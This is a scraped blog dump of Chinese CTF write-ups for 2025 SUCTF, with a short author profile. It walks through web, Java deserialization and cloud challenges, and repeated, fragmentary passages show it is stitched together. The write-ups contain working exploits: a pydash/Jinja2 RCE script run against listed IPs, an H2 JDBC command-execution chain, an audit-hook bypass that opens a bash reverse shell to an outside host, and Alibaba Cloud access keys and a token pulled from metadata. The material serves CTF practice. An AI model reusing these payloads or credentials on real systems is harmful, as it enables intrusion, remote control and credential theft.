request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + 